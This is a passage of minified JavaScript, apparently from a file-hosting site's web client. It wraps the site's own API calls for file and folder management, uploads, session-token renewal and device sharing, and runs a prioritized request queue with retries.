a={filename:t.filename,hash:t.hash,size:t.size,folder_key:t.folder_key,action_on_duplicate:t.duplicate?t.duplicate:void 0,path:t.path?t.path:void 0,resumable:t.resumable?"yes":void 0,unit_size:t.unit_size?t.unit_size:void 0,preemptive:"yes"};L({type:"POST",url:"/api/1.5/upload/check.php?r="+aC(4),data:a,success:function(o){var n="yes"!=o.response.file_exists||t.duplicate&&"skip"!==t.duplicate;t.instant&&o.response&&"yes"==o.response.hash_exists&&n?L({type:"POST",url:"/api/1.5/upload/instant.php?r="+aC(4),data:a,success:function(a){e.extend(o,a),t.callbacks.success&&t.callbacks.success(o)},error:t.callbacks.error||c.error||{}}):t.callbacks.success&&t.callbacks.success(o)},error:t.callbacks.error||c.error||{}})},_.adu=function(e,t,a,o,n){L({type:"POST",url:"/api/1.5/upload/instant.php?r="+aC(4),data:{filename:e,hash:t,size:a,folder_key:o},success:n.success||{},error:n.error||c.error||{}})},_.aad=function(t,a,o){var n={quick_key:t};a&&(n.folder_key=a);try{gtag("event","move")}catch(e){}L(e.extend({type:"POST",url:"/api/1.4/file/move.php?r="+aC(4),data:n},b(o)),-2,!0)},_.aET=function(a,o,n){aXY((function(r){var i={quick_key:a};o&&(i.folder_key=o),t&&(i.session_token=t);try{gtag("event","copy")}catch(e){}L(e.extend({type:"POST",url:"/api/1.4/file/copy.php?r="+aC(4),data:i},b(n)),-2,!0)}))},_.aUT=function(a,o,n){var r={keys:a,meta_only:"yes"};if(o)for(aMT in o)r[aMT]=o[aMT]?"yes":"no";t&&(r.session_token=t),L({type:"POST",url:"/api/1.4/file/zip.php?r="+aC(4),data:r,success:function(){r.response_format="json",r.meta_only="no";var t=e("<form>",{method:"post",action:"/api/1.4/file/zip.php?r="+aC(4),target:"zipdownload",style:"display: none"});for(var a in r){var o=e("<input>",{name:a,value:r[a]});t.append(o)}var n=e("<input>",{type:"submit"});t.append(n),e(document.body).append(t),t.trigger("submit")},error:w(n)},-2,!0)},_.auY=function(t,a,o){var n={quick_key:t};a&&"myfiles"!=a&&(n.folder_key=a),L(e.extend({type:"POST",url:"/api/1.4/file/copy.php?r="+aC(4),data:n},b(o)),-2,!0)},_.asi=function(t,a){var o="";o=e.isArray(t)?t.join():t;L({type:"POST",url:"/api/1.5/file/get_info.php?r="+aC(4),data:{quick_key:o},success:function(e,t,o){v(a).apply(this,[e,t,o])},error:w(a)})},_.prototype.WJ=function(t,a,o,n,r){o||(o=a,a={}),a.quick_key||(a.quick_key=this.quickkey),L(e.extend({url:t,data:a},b(o)),n,r)},_.prototype.avz=function(){return this.filename||""},_.prototype.WX=function(){return this.quickkey},_.prototype.Yw=function(t){var a=this;this.WJ("/api/1.5/file/get_info.php?r="+aC(4),{success:function(o,n,r){o&&(e.each(o.response.file_info,(function(e,t){a[e]=t})),null===a.filename&&(a.filename="UNKNOWN FILE")),v(t).apply(this,[o,n,r])},error:w(t)})},_.prototype.aNW=function(e,a){a||(a=e,e={}),e.data=e.data||{},t&&(e.data.session_token=t);this.WJ("/api/1.4/file/one_time_key.php?r="+aC(4),e.data,{success:function(e){v(a).apply(this,[e.response])},error:w(a)})},_.prototype.aYV=function(e){this.WJ("/api/1.4/file/get_links.php?link_type=direct_download&r="+aC(4),{},{success:function(t){v(e).apply(this,[t.response])},error:w(e)})},_.prototype.MFAPI_GetLinks=function(e,t){t||(t=e,e={}),e.data=e.data||{};this.WJ("/api/1.4/file/get_links.php?r="+aC(4),e,{success:function(e){v(t).apply(this,[e.response])},error:w(t)})},_.MFAPI_ConfigureOneTimeKey=function(e,t,a){a||(a=t,t={}),t.data=t.data||{},t.data.token=e,t.url="/api/1.4/file/configure_one_time_key.php?r="+aC(4);t.success=function(e){v(a).apply(this,[e.response])},t.error=w(a),L(t)},_.prototype.YH=function(e){var t=e.error||c.error||!1;this.WJ("/api/1.4/file/delete.php?r="+aC(4),{},{success:function(t,a,o){200==o.status?v(e).apply(this,[t,a,o]):w(e).apply(this,[t,a,o])},error:t},1,!0)},_.prototype.beo=function(e){var t=e.error||c.error||!1;this.WJ("/api/1.4/file/purge.php?r="+aC(4),{},{success:function(t,a,o){200==o.status?v(e).apply(this,[t,a,o]):w(e).apply(this,[t,a,o])},error:t},1,!0)},_.prototype.aad=function(e,t){t||(t=e,e=null);t.error;try{gtag("event","move")}catch(e){}this.WJ("/api/1.4/file/move.php?r="+aC(4),{},b(t),1,!0)},_.prototype.aET=function(e,a){aXY((function(o){a||(a=e,e=null),t&&(data.session_token=t);a.error;try{gtag("event","copy")}catch(e){}this.WJ("/api/1.4/file/copy.php?r="+aC(4),{},b(a),1,!0)}))},_.prototype.Yn=function(t,a){var o=this;if(this.WJ("/api/1.5/file/update.php?r="+aC(4),t,{success:function(n){t.filename&&(t.filename=t.filename.stripTags()),t.tags&&(t.tags=t.tags.stripTags()+""),t.description&&(t.description=t.description.stripTags()),e.extend(o,t),v(a).apply(this,arguments)},error:w(a)},1,!0),t.filename)try{gtag("event","rename")}catch(e){}},_.prototype.agq=function(e,t){var a={from_quickkey:this.quickkey,to_quickkey:e};this.WJ("/api/1.5/file/update_file.php?r="+aC(4),a,t,1,!0)},_.prototype.aiV=function(e,t){this.WJ("/api/1.4/file/copy.php?r="+aC(4),{},e,1,!0)},_.prototype.MFAPI_UpdateFilePassword=function(e,t){var a={quick_key:this.quickkey,password:e};this.WJ("/api/file/update_password.php?r="+aC(4),a,t,1,!0)},_.prototype.aax=function(e){this.Yn({privacy:"public"},e)},_.prototype.aaG=function(e){this.Yn({privacy:"private"},e)},_.prototype.Zt=function(){return"public"===this.privacy},_.prototype.abL=function(){return"private"===this.privacy},_.prototype.abQ=function(){return"yes"===this.password_protected},_.prototype.axV=function(){return aCf(this)},_.prototype.aFP=function(){return aGe(this)},_.prototype.abK=g,_.prototype.Zp=function(){for(var e=[],t=this;t!=t.parent&&(t=t.parent);)e.push(t);return e},_.prototype.aqD=function(e){var t=this.ajw(),a=e.ajw();if(t&&a){if(t.toLowerCase()!==a.toLowerCase())return!1}else if(t||a)return!1;return!0},_.prototype.ajw=function(){var e,t;return"string"==typeof this.filename&&(!!(e=this.filename.match(/\.[^.]+$/))&&(!!(t=e[0])&&t))},k.aaW=function(e){return e instanceof k},k.YH=function(t,a){L(e.extend({type:"POST",url:"/api/1.4/folder/delete.php?r="+aC(4),data:{folder_key:t}},b(a)),-2,!0)},k.beo=function(t,a){L(e.extend({type:"POST",url:"/api/1.4/folder/purge.php?r="+aC(4),data:{folder_key:t}},b(a)),-2,!0)},k.aad=function(t,a,o){o||(o={}),o.success||(o.success=a,a=null);var n={folder_key_src:t};a&&(n.folder_key_dst=a),n.folder_key_src,n.folder_key_dst;try{gtag("event","move")}catch(e){}L(e.extend({type:"POST",url:"/api/1.4/folder/move.php?r="+aC(4),data:n},b(o)),-2,!0)},k.aET=function(a,o,n){aXY((function(r){var i={folder_key_src:a};o&&(i.folder_key_dst=o),t&&(i.session_token=t);try{gtag("event","copy")}catch(e){}L(e.extend({type:"POST",url:"/api/1.4/folder/copy.php?r="+aC(4),data:i},b(n)),-2,!0)}))},k.asi=function(t,a,o){var n="";n=e.isArray(t)?t.join():t,bkM=o?"yes":"no";L({type:"POST",url:"/api/1.4/folder/get_info.php?r="+aC(4),data:{folder_key:n,details:bkM},success:function(e,t,o){v(a).apply(this,[e,t,o])},error:w(a)},!1,!0)},k.prototype.avz=function(){return this.name||""},k.prototype.WX=function(){return this.folderkey},k.prototype.WJ=function(t,a,o,n,r){o||(o=a,a={}),a.data=a.data||{},a.data.folder_key||(a.data.folder_key=this.folderkey),e.extend(a,b(o)),L(e.extend({url:t},a),n,r)},k.prototype.Yw=function(t,a){a||(a=t,t={}),t.data?YU=t.data.recursive:YU="no";var o=this;o.folders||(o.folders={}),t.type="POST";this.WJ("/api/1.4/folder/get_info.php?r="+aC(4),t,{success:function(t,n,r){if(t&&(o.etag=r.getResponseHeader("etag"),t.response.folder_info)){var i=t.response.folder_info;null===o.name&&(o.name="UNKNOWN FOLDER"),("undefined"==typeof SHARED||!SHARED&&i.flag)&&(o.shared=1==avH(i.flag,1)?"no":"yes"),e.each(i,(function(e,t){"files"!=e&&"folders"!=e&&(o[e]=t)})),i.folders&&i.folders.length>0||i.files&&i.files.length>0?(o.Yy(i,"yes"===YU,!0),o.ZW(i.files)):t.empty_results=!0}v(a).apply(this,arguments)},error:w(a)})},k.prototype.aEn=function(t,a,o){o||(o=a,a=t,t={});var n=this;n.folders||(n.folders={}),n.files||(n.files={});var r="/api/1.4/folder/get_content.php";"trash"===this.folderkey&&(r="/api/1.4/device/get_trash.php"),this.WJ(r+"?r="+aC(4),t,{success:function(t,o,r){var i=[];if(t){var s=t.response&&"device/get_trash"===t.response.action?t.response:t.response.folder_content;s&&(e.each(s,(function(e,t){"files"!=e&&"folders"!=e&&"content_type"!=e&&(n[e]=t)})),(s.folders&&s.folders.length>0||s.files&&s.files.length>0)&&(s.folders&&(s.folderCount=s.folders.length,e.each(s.folders,(function(e,t){"undefined"!=typeof SHARED&&SHARED||!t.flag||(s.folders[e].shared=avH(t.flag,1)?"no":"yes"),"yes"!=n.shared&&"child"!=n.shared||(s.folders[e].shared="child",s.folders[e].owner_name=n.owner_name),s.folders[e].parent_chunk=s.chunk_number,i.push(s.folders[e])})),n.Yy(s,!1,!1),"yes"!=s.more_chunks?n.folders_loaded=!0:n.folders_loaded=!1),s.files&&(e.each(s.files,(function(e,t){s.files[e].parent_chunk=s.chunk_number,i.push(s.files[e])})),n.ZW(s.files),"yes"!=s.more_chunks?n.files_loaded=!0:n.files_loaded=!1),n[s.content_type+"_chunk"]=s.chunk_number),s[s.content_type]&&0!=s[s.content_type].length||(n[s.content_type+"_loaded"]=!0),s.content_type&&s.chunk_number&&(n[s.content_type+"_chunk"]=s.chunk_number))}v(a).call(this,n,i,t)},error:w(a)},o)},k.prototype.abT=function(e){var t=this;this.WJ("/api/1.4/folder/get_info.php?r="+aC(4),{success:function(a,o,n){if(a)if(a.response.folder_info.note){var r=a.response.folder_info.note;t.note_subject=r.subject||"",t.note_description=r.description||""}else t.note_subject="",t.note_description="";v(e).apply(this,arguments)},error:w(e)})},k.prototype.ZL=function(e){this.Yw({data:{recursive:"yes",folder_key:this.ZA()}},e)},k.prototype.ZA=function(){var t=[];return e.each(this.folders,(function(e){t.push(e)})),t.join(",")},k.prototype.YS=function(t,a){var o=this;a||(a=t,t=!1);var n=o.aaf();if("myfiles"!=o.folderkey)if(n<=i)o.Yw({data:{recursive:"yes"}},a);else if(o.aag()<i)o.Yw({data:{recursive:"no"}},(function(){if(t){var n=[];e.each(o.folders||[],(function(e,t){t.aaf()>i?t.YS(!0,a):n.push(t)}))}v(a).apply(this,arguments)}));else{o.Ze(0,i,n,(function(){t&&e.each(o.folders||[],(function(e,t){t.YS(!0,a)})),v(a).apply(this,arguments)}))}else e.each(o.folders||[],(function(e,t){null!==t.folderkey&&t.YS(!0,a)}))},k.prototype.Ze=function(e,t,a,o){var n=this,r={data:{recursive:"no",start:e,limit:t}};n.Yw(r,{success:function(){r.data.empty_result||e+t>=a?v(o).apply(this,arguments):n.Ze(e+t,t,a,o)},error:w(o)})},k.prototype.aaf=function(){var t=this.aag();return e.each(this.folders,(function(e,a){t+=parseInt(a.aaf())})),t},k.prototype.YH=function(e){this.WJ("/api/1.4/folder/delete.php?r="+aC(4),{},e,-2,!0)},k.prototype.beo=function(e){this.WJ("/api/1.4/folder/purge.php?r="+aC(4),{},e,-2,!0)},k.prototype.aad=function(e,t){t||(t=e,e=null);var a={};e&&(a.folder_key_dst=e);try{gtag("event","move")}catch(e){}this.WJ("/api/1.4/folder/move.php?r="+aC(4),{data:a},t,-2,!0)},k.prototype.Yn=function(t,a){var o=this;if(this.WJ("/api/1.4/folder/update.php?r="+aC(4),{data:t},{success:function(n){t.foldername&&(t.name=t.foldername,delete t.foldername),delete t.privacy_recursive,t.description&&(t.description=t.description.stripTags()),e.extend(o,t),v(a).apply(o,arguments)},error:w(a)},1,!0),t.foldername)try{gtag("event","rename")}catch(e){}},k.prototype.aoo=function(e,t,a){a||(a=t,t=null);var o={foldername:e};t&&(o.parent=t),this.WJ("/api/1.4/folder/create.php?r="+aC(4),{data:o},a,1,!0)},k.prototype.aET=function(e,a){aXY((function(o){var n={folder_key_src:this.folderkey};a||(a=e,e=null),e&&(n.folder_key_dst=e),t&&(data.session_token=t);a.error;try{gtag("event","copy")}catch(e){}this.WJ("/api/1.4/folder/copy.php?r="+aC(4),{},b(a),1,!0)}))},k.prototype.aax=function(e,t){this.Yn({privacy:"public",privacy_recursive:e?"yes":"no"},t)},k.prototype.aaG=function(e,t){this.Yn({privacy:"private",privacy_recursive:e?"yes":"no"},t)},k.prototype.Zt=function(){return"public"===this.privacy},k.prototype.abL=function(){return"private"===this.privacy},k.prototype.aaM=function(){return!e.isEmptyObject(this.folders)||!e.isEmptyObject(this.files)},k.prototype.aag=function(t){var a=parseInt(this.file_count||0);return isNaN(a)&&(a=0),t&&e.each(this.folders,(function(e,t){a+=t.aag(!0)})),a},k.prototype.MFAPI_FolderCount=function(t){var a,o=this;return a=void 0!==o.folder_count?parseInt(o.folder_count,10)||0:parseInt(sizeOf(o.folders),10)||0,isNaN(a)&&(a=0),t&&e.each(o.folders,(function(e,t){a+=t.MFAPI_FolderCount(!0)})),a},k.prototype.MFAPI_ChildCount=function(){return this.aag()+this.MFAPI_FolderCount()},k.prototype.Yp=function(e,t){var a=this,o={foldername:e,parent_key:a.folderkey};"myfiles"===o.parent_key&&(o.parent_key="");L({url:"/api/1.4/folder/create.php?r="+aC(4),data:o,success:function(o){var n=o.response,r={name:e.stripTags(),folderkey:n.folder_key,created:n.created,privacy:n.privacy?n.privacy:"private",permissions:n.permissions};v(t).call(null,new k(r,a),o)},error:w(t)},1,!0);try{gtag("event","create_folder")}catch(e){}},k.prototype.CreateSubFile=function(e,t,a){var o=this,n={};e&&(n.filename=e),t&&(n.file_extension=t),o.folderkey&&"myfiles"!=o.folderkey&&(n.parent_key=o.folderkey),n.type="text";L({url:"/api/1.4/file/create.php?r="+aC(4),data:n,success:function(e){v(a).call(null,new _(e.response.fileinfo,o),e)},error:w(a)},1,!0)},k.prototype.aaL=function(){var t=this,a={};t.folders.constructor==Array&&(e.each(t.folders,(function(e,t){a[t.folderkey]=t})),t.folders=a)},k.prototype.aaJ=function(){var t={};e.each(this.files,(function(e,a){t[a.quickkey]=a})),this.files=t},k.prototype.awa=function(t){var a=this;e.each(t,(function(e,t){"files"!=e&&"folders"!=e&&(a[e]=t)}))},k.prototype.Yy=function(t,a,o){var n=this;a&&!o&&(n.folders={},n.files={}),n.folders&&n.folders.constructor==Array&&n.aaL(),n.files&&n.files.constructor==Array&&n.aaJ(),null===n.name&&(n.name="UNKNOWN FOLDER"),e.each(t.folders||{},(function(r,i){n.folders||(n.folders={}),o&&n.folders[i.folderkey]&&n.folders[i.folderkey].constructor!=Object||(n.folders[i.folderkey]=new k(i,n)),e.each(i,(function(e,t){"files"!=e&&"folders"!=e&&(n.folders[i.folderkey][e]=i[e]),"yes"==n.shared&&"child"==n.shared&&(n.folders[i.folderkey].shared="child")})),n.folders[i.folderkey].owner_name||(n.folders[i.folderkey].owner_name=n.owner_name),a&&n.folders[i.folderkey].Yy(t.folders[r],!0,o)})),t.files&&n.ZW(t.files)},k.prototype.ZW=function(t){var a=this;a.files||(a.files={}),e.each(t||{},(function(e,t){t.quickkey&&(a.files[t.quickkey]=new _(t,a),a.files[t.quickkey].owner_name=a.owner_name,null===a.files[t.quickkey].filename&&(a.files[t.quickkey].filename="UNKNOWN FILE"),a.files[t.quickkey].preview=aCf(t)?"yes":"no")})),a.aaJ()},k.prototype.abK=g,k.prototype.Zp=function(){for(var e=[],t=this;t!=t.parent&&(t=t.parent);)e.push(t);return e},k.prototype.aHV=function(e){L({url:"/api/1.4/folder/get_depth.php?r="+aC(4),data:{folder_key:this.folderkey},success:function(t,a){v(e).call(null,t)}})},k.prototype.aaz=function(t){s.push(this),l[this.folderkey]=this,t&&e.each(this.folders,(function(e,t){t.aaz(!0)}))},k.prototype.aeo=function(){var t=[];return t=t.concat(e.values(this.folders),e.values(this.files)),sizeOf(this.folders)&&e.each(this.folders,(function(e,a){t=t.concat(a.aeo())})),t},k.prototype.aFG=function(t,a){L(e.extend({url:"/api/1.4/folder/search.php?r="+aC(4),success:function(e,t){v(a).call(null,e)},error:w(a)},t))},x.prototype.sB=function(t){L(e.extend({url:"/api/1.4/billing/get_invoice.php?r="+aC(4)},b(t)))},H.prototype.acA=function(a){L({url:"/api/1.4/user/renew_session_token.php?r="+aC(4),success:function(e,o,n){t=this.session_token||t,v(a).call(null,e)},error:function(a,o,n){e.getJSON("/dynamic/get_session_token.php?rand="+aC(5),(function(e){e.session_token?(t=e.session_token,"undefined"!=typeof beR&&beR(t)):"user_logged_out"==e.error&&(r.aaU(!0),C())}))}},-2)},H.prototype.aZf=function(t,a){var o=t.success;L(e.extend({type:"POST",url:"/api/1.4/user/fetch_tos.php?r="+aC(4),success:o,error:w(t)},a))},H.prototype.Yw=function(t){L(e.extend({url:"/api/1.4/user/get_info.php?r="+aC(4)},b(t)))},H.prototype.aFf=function(a,o){if(t){o||(o=a,a={});L({url:"/api/1.4/folder/get_content.php?r="+aC(4),data:e.extend({content_type:"folders"},a),success:function(t,a,n){if(t){var r=new tH.yJ({name:"My Files",folderkey:"myfiles",created:"",etag:n.getResponseHeader("etag")});r.folder_count=t.response.folder_content.folders.length,r.Yy(t.response.folder_content,!1),e.each(r.folders,(function(e,t){0==parseInt(t.file_count)&&null===t.name&&(t.name="UNKNOWN FOLDER"),t.aaz(!0)})),s.sort(F)}v(o).call(null,r,t)},error:w(o)})}},H.prototype.aDZ=function(t,a){a||(a=t,t={}),L(e.extend({url:"/api/1.4/user/get_devices.php?r="+aC(4),success:v(a),error:w(a)},t))},H.prototype.aKH=function(t,a){a||(a=t,t={}),L(e.extend({url:"/api/1.4/user/link_facebook.php?r="+aC(4),success:v(a),error:w(a)},t))},H.prototype.boC=function(t,a){a||(a=t,t={}),L(e.extend({url:"/api/1.4/user/unlink_facebook.php?r="+aC(4),success:v(a),error:w(a)},t))},H.prototype.boq=function(t,a){a||(a=t,t={}),L(e.extend({url:"/api/1.4/user/link_twitter.php?r="+aC(4),success:v(a),error:w(a)},t))},H.prototype.bnE=function(t,a){a||(a=t,t={}),L(e.extend({url:"/api/1.4/user/unlink_twitter.php?r="+aC(4),success:v(a),error:w(a)},t))},H.prototype.aWB=function(e,a){t&&L({type:"POST",url:"/api/1.4/upload/set_options.php?r="+aC(4),data:e,success:v(a),error:w(a)},1,!0)},H.prototype.MFAPI_GetActionToken=function(e){t&&L({type:"POST",url:"/api/1.5/user/get_action_token.php?r="+aC(4),data:{type:"upload",lifespan:1440},success:v(e),error:w(e)})},H.prototype.aXn=function(e){t&&L({type:"POST",url:"/api/1.4/user/get_settings.php?r="+aC(4),success:v(e),error:w(e)})},H.prototype.lq=function(e,a){t&&L({type:"POST",url:"/api/1.4/user/set_settings.php?r="+aC(4),data:e,success:v(a),error:w(a)},1)},H.prototype.azo=function(e,a){t&&L({type:"POST",url:"/api/1.4/user/update.php?r="+aC(4),data:e,success:v(a),error:w(a)},1)},H.prototype.Vw=function(e,a){t&&L({type:"POST",url:"/api/1.4/upload/add_web_upload.php?r="+aC(4),data:e,success:v(a),error:w(a)})},H.prototype.Vu=function(e,a){t&&L({type:"POST",url:"/api/1.4/upload/get_web_uploads.php?r="+aC(4),data:e,success:v(a),error:w(a)})},$.Yw=function(t,a){a||(a=t,t={});L(e.extend({url:"/api/1.4/system/get_info.php?r="+aC(4),success:function(e,t,o){if(e&&e.response){var n,r=e.response;if(window.tH.configuration=r,window.tH.current_api_version=r.current_api_version,localStorage&&localStorage.current_api_version!=r.current_api_version)localStorage.user?(n=localStorage.user.split("_")[0]+"_"+r.current_api_version.replace(".","_"),localStorage.user=n,MYF_sUserEnc=n):MYF_sUserEnc&&(n=MYF_sUserEnc.split("_")[0]+"_"+r.current_api_version.replace(".","_"),localStorage.user=n,MYF_sUserEnc=n),localStorage.clear(),localStorage.current_api_version=r.current_api_version;delete window.tH.configuration.action,delete window.tH.configuration.result}v(a).call(null,e)}},t))},$.aIx=function(t){L(e.extend({url:"/api/1.4/system/get_version.php?r="+aC(4)},b(t)))},S.prototype.Sx=function(t,a){a||(a=t,t={}),L(e.extend({url:"/api/1.4/notifications/peek_cache.php?r="+aC(4),success:v(a),error:w(a)},t))},S.prototype.Uh=function(t,a){a||(a=t,t={}),L(e.extend({url:"/api/1.4/notifications/get_cache.php?r="+aC(4),success:v(a),error:w(a)},t))},E.prototype.bgL=function(t,a){a||(a=t,t={}),L(e.extend({url:"/api/1.4/device/get_status.php?r="+aC(4),success:v(a),error:w(a)},t))},E.prototype.hV=function(t,a){a||(a=t,t={}),L(e.extend({url:"/api/1.4/notifications/send_message.php?r="+aC(4),success:v(a),error:w(a)},t))},E.prototype.hH=function(t,a){a||(a=t,t={}),L(e.extend({url:"/api/1.5/device/share_resources.php?r="+aC(4),success:v(a),error:w(a)},t))},E.prototype.aQJ=function(t,a){a||(a=t,t={}),L(e.extend({url:"/api/1.4/device/request_foreign_resource.php?r="+aC(4),success:v(a),error:w(a)},t))},E.prototype.im=function(t,a){a||(a=t,t={}),L(e.extend({url:"/api/1.4/device/unshare_resources.php?r="+aC(4),success:v(a),error:w(a)},t))},E.prototype.hS=function(t,a){a||(a=t,t={}),L(e.extend({url:"/api/1.4/device/get_user_shares.php?r="+aC(4),success:v(a),error:w(a)},t))},E.prototype.jj=function(t,a){a||(a=t,t={}),L(e.extend({url:"/api/1.4/device/get_resource_shares.php?r="+aC(4),success:v(a),error:w(a)},t))},E.prototype.Qu=function(t,a){a||(a=t,t={}),L(e.extend({url:"/api/1.4/device/get_foreign_resources.php?r="+aC(4),success:v(a),error:w(a)},t))},E.prototype.Wh=function(t,a){a||(a=t,t={}),L(e.extend({url:"/api/1.4/device/toggle_foreign_resource_sync.php?r="+aC(4),success:v(a),error:w(a)},t))},E.prototype.aMs=function(t,a){a||(a=t,t={}),L(e.extend({url:"/api/1.4/device/set_foreign_resource_sync.php?r="+aC(4),success:v(a),error:w(a)},t))},E.prototype.beN=function(t,a){a||(a=t,t={}),L(e.extend({url:"/api/1.4/device/get_trash.php?r="+aC(4)+"&device_id="+this.aCh+"&data_only="+(t.data_only?"yes":"no")+(t.content_type?"&content_type="+t.content_type:""),success:v(a),error:w(a)},t))},E.prototype.MFAPI_EmptyTrash=function(t){L(e.extend({url:"/api/1.4/device/empty_trash.php?r="+aC(4),success:v(t),error:w(t)},{}))},E.prototype.bgS=function(t,a){a||(a=t,t={}),L(e.extend({url:"/api/1.4/device/get_changes.php?r="+aC(4)+"&device_id="+this.aCh+"&revision="+(t.revision?t.revision:"0"),success:v(a),error:w(a)},t))},E.prototype.bx=function(t,a){a||(a=t,t={}),L(e.extend({url:"/api/1.4/file/recently_modified.php?r="+aC(4)+"&number_of_files="+(t.amount?t.amount:"10"),success:v(a),error:w(a)},t))},E.prototype.aAe=function(e,t){t&&L({url:"/api/1.4/device/unfollow_resource.php?r="+aC(4),success:v(t),error:w(t),data:{resource:e}})};var M=null;function B(){new window.tH.aCa(window.aCQ).bgL((function(e){var t=!1;e.response&&"yes"==e.response.async_jobs_in_progress&&(t=!0),clearInterval(M),M=null,t?(bfu("Working..."),M=setTimeout(B,1e3)):(bek(),void 0!==FI&&FI(null,null,null,!0))}))}function L(n,i,s,l){if(n.data=n.data||{},(void 0===i||isNaN(i))&&(i=1),s&&p){var d=aC(5)+"::"+(new Date).getTime();e.extend(n,{complete:function(e){try{var t=JSON.parse(e.responseText);"yes"==t.response.asynchronous&&B(),104!=t.response.error&&105!=t.response.error&&T(d)}catch(e){}}});var c={id:d,options:n,priority:i},f=[],u=aL(p);u&&(f=JSON.parse(u)),f.push(c),aU(p,JSON.stringify(f),300)}else e.extend(n,{complete:function(e){try{"yes"==JSON.parse(e.responseText).response.asynchronous&&B()}catch(e){}}});t&&!1===n.url.indexOf("user/renew_session_token")&&!1===n.url.indexOf("folder/get_revision")&&y(),t&&(n.data.session_token=t),a&&(n.data.response_format=a),e.extend(n,{beforeSend:function(e){e.setRequestHeader("Cache-Control","no-cache")}}),i<0?-1==i?(r.aaU(),n.url&&(n.timeout=n.timeout||o,r.bhq(n)),r.Zl()):n.url&&(n.timeout=n.timeout||o,r.bhq(n)):r.aaS({WH:n,Yi:null,boi:l},i)}function O(e){this.YK=[],this.YW=[[],[],[]],this.YY=e||2}O.prototype.ZD=function(e,t){void 0!==t&&this.YW[t]||(t=1),this.YW[t].push(e)},O.prototype.aaS=function(e,t){this.ZD(e,t),this.Zl()},O.prototype.bhq=function(a){if(a.url){var o=this,n=a.success,r=a.error,i=jQuery.extend(!0,{},a);i.success=null,i.error=null,e.ajax(i).done((function(t,r,i){null===t||""==t||e.isEmptyObject(t)?o.aaS({WH:a,Yi:null},1):n&&n(t,r,i)})).fail((function(n,i,s){if("timeout"==i)o.aaS({WH:a,Yi:null},1);else if("error"==i){var l=jQuery.parseJSON(n.responseText);l&&100==l.response.error?o.aaS({WH:a,Yi:null},1):!l||104!=l.response.error&&105!=l.response.error?e.isFunction(r)&&r(n,i,s):e.getJSON("/dynamic/get_session_token.php?rand="+aC(5),(function(e){e.session_token?(t=e.session_token,"undefined"!=typeof beR&&beR(t),o.aaU(),I()):"user_logged_out"==e.error&&(o.aaU(),C())}))}}))}},O.prototype.Zl=function(){if(h)this.aaU();else if(this.YK.length<this.YY){var a=2;if(this.YW[0].length>0?a=0:this.YW[1].length>0&&(a=1),this.YW[a].length>0){var r=this,i=r.YW[a].shift();if(m.prev==i.WH.url.substring(0,i.WH.url.indexOf("?"))?m.count++:(m.prev=i.WH.url.substring(0,i.WH.url.indexOf("?")),m.count=1,m.start=(new Date).getTime()),-1!=m.prev.indexOf("peek_cache")&&m.count>3){if((new Date).getTime()-m.start<3e4)return;m.count=1,m.start=(new Date).getTime()}if(r.YK.push(i),i&&i.WH.url){i.WH.timeout=i.WH.timeout||o;var s=i.WH.success,l=i.WH.error,d=jQuery.extend(!0,{},i.WH);d.success=null,d.error=null,t&&d.data.session_token!=t&&(d.data.session_token=t),i.Yi=e.ajax(d).done((function(t,o,d){null===t||""==t||e.isEmptyObject(t)?!i.ajt||i.ajt<n?(i.ajt=i.ajt?i.ajt+1:1,r.aaS(i,a)):e.isFunction(l)&&l(t,o,d):s&&s(t,o,d)})).fail((function(o,s,d){if("timeout"==s)!i.ajt||i.ajt<n?(i.ajt=i.ajt?i.ajt+1:1,r.aaS(i,a)):e.isFunction(l)&&l(o,s,d);else if("error"==s){var c;try{c=jQuery.parseJSON(o.responseText)}catch(e){}c&&100==c.response.error?!i.ajt||i.ajt<n?(i.ajt=i.ajt?i.ajt+1:1,r.aaS(i,a)):e.isFunction(l)&&l(o,s,d):!c||104!=c.response.error&&105!=c.response.error?e.isFunction(l)&&l(o,s,d):e.getJSON("/dynamic/get_session_token.php?rand="+aC(5),(function(e){e.session_token?(t=e.session_token,"undefined"!=typeof beR&&beR(t),r.aaU(),r.ZD(i,0),I()):"user_logged_out"==e.error&&(r.aaU(),r.ZD(i,0),C())}))}})).always((function(){if(e.isArray(r.YK)&&r.YK.length){var t=e.inArray(i,r.YK);-1!=t&&r.YK.splice(t,1)}r.Zl()}))}}else f.call(null)}},O.prototype.aaU=function(e,t){for(var a=this,o=[],n=0;n<a.YK.length;n++){var r=a.YK[n];r&&(t&&!r.boi||(r.Yi&&r.Yi.abort(),r.Yi=null,t&&o.push(n),!0!==e&&a.ZD(r,0)))}if(t)for(n=0;n<o.length;n++)a.YK.splice(o[n],1);else a.YK=[]};window.tH={Cp:_,yJ:k,cD:x,Dv:H,aCO:$,SU:S,aBS:function(a){this.session_token=a||t,this.aDt=function(t,a){a||(a=t,t={}),L(e.extend({url:"/api/1.4/contact/fetch.php?r="+aC(4),success:v(a),error:w(a)},t))},this.ZD=function(t,a){a||(a=t,t={}),t.timeout=9e4,L(e.extend({url:"/api/1.4/contact/add.php?r="+aC(4),success:v(a),error:w(a)},t),1,!0)},this.boU=function(t,a){a||(a=t,t={}),t.timeout=9e4,L(e.extend({url:"/api/1.4/contact/get_sources.php?r="+aC(4),success:v(a),error:w(a)},t),1,!0)}},aCa:E,YQ:function(s,l,c,f,u,h,m,g){t=s,l,a=c,f&&(o=f),u&&(n=u),h&&(i=h),m&&(d=m,window.tH.aaI=d),g&&(p=g),t&&y(),p&&I(),t&&B(),e(window).hashchange((function(){r.aaU(!1,!0)}))},acq:c,agS:f,aAM:1e6,azm:20,adq:function(){return t||!1},aQQ:y}}(jQuery);var MFTOUR_sPreviousSlideHash=!1,MFTOUR_bIsAnimating=!1;function aow(e){e.bind("click",(function(){e.removeClass("collapsed"),e.addClass("expanded");$("#main .bottom-area").offset().top;e.slideUp(1e3,"easeOutQuad"),$("#main .top-area").children().animate({opacity:"0"},500),$("#main .top-area").attr("prevBottom",$("#main .top-area").css("bottom")),$("#main .top-area").animate({bottom:"0"},1e3,"easeOutQuad",(function(){e.unbind("click"),apq(e,!1)}))}))}function anE(e){$("#main .top-area").children().hide(),apq(e,!0)}function apq(e,t){$.ajax({url:"/tour/tour.php",method:"POST",success:function(a){$("#tour-content-container").append(a),alK(a),$("#tour-wrap").height($(window).height()).css({"margin-top":"100%"}),$("#tour-wrap").animate({"margin-top":"0%"},1e3,"easeOutExpo",(function(){$(this).css({height:"auto"})})),$(".tour-hide").unbind("click").bind("click",(function(a){return t&&$("#main .top-area").children().show(),$("#tour-wrap").animate({"margin-top":"100%",bottom:"-100%"},1e3,"easeOutExpo",(function(){t||($("#main 